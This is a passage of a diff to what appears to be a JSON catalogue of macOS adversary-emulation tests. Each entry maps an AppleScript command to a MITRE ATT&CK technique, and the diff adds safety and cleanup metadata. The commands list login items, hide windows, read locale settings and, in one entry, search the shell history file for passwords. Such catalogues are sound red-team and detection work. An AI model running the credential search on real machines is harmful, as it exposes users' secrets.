     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Lists all login items.",
     "technique_id": "T1547.015",
     "technique_name": "Boot or Logon Autostart Execution: Login Items",
@@ -642,7 +1023,12 @@
     "command": "set homeDir to (path to home folder as text)\nset historyPath to homeDir & \"#{filename}\"\n\ntry\n    set fileContent to read file historyPath\n    set lineList to paragraphs of fileContent\n    set matchCount to 0\n    set matchList to {}\n\n    repeat with currentLine in lineList\n        set lineText to currentLine as string\n\n        if lineText starts with \": \" and lineText contains \";\" then\n            set semicolonPos to offset of \";\" in lineText\n            if semicolonPos > 0 then\n                set lineText to text (semicolonPos + 1) thru -1 of lineText\n            end if\n        end if\n\n        if lineText contains \"#{searchTerm}\" then\n            set matchCount to matchCount + 1\n            if matchCount ≤ 10 then\n                set end of matchList to lineText\n            end if\n        end if\n    end repeat\n\n    return \"Found \" & matchCount & \" matches:\" & return & (matchList as string)\non error errMsg\n    return \"Error: \" & errMsg\nend try\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "This test searches for passwords in the bash history file.",
     "technique_id": "T1552.003",
     "technique_name": "Unsecured Credentials: Bash History",
@@ -653,7 +1039,14 @@
     "command": "tell application \"#{applicationName}\" to set visible of front window to false\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Hides the Application window",
     "technique_id": "T1564.003",
     "technique_name": "Hide Artifacts: Hidden Window",
@@ -664,7 +1057,12 @@
     "command": "get user locale of (system info)",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "An adversary may gather the system locale settings in order to infer the geographical location of that host.",
     "technique_id": "T1614.001",
     "technique_name": "System Location Discovery: System Language Discovery",
@@ -675,7 +1073,12 @@
     "command": "system attribute \"LANG\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "An adversary may gather the system language settings from the LANG environment variable.",
     "technique_id": "T1614.001",
     "technique_name": "System Location Discovery: System Language Discovery",
